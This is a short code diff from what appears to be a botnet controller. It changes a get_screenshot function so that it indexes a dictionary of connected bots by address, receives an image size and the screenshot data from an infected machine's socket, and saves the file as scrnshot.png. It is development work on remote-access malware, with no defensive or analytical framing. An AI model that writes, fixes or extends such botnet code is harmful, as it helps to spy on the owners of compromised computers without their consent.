@@ -119,8 +119,8 @@ def get_screenshot(addr):
             pass
     except:
         pass
-    size = botnet[bot].recv(1024).decode()
-    image = botnet[bot].recv(int(size))
+    size = botnet[addr].recv(1024).decode()
+    image = botnet[addr].recv(int(size))
     check_container(addr)
     #os.chdir(addr)
     file = open("scrnshot.png",'wb')
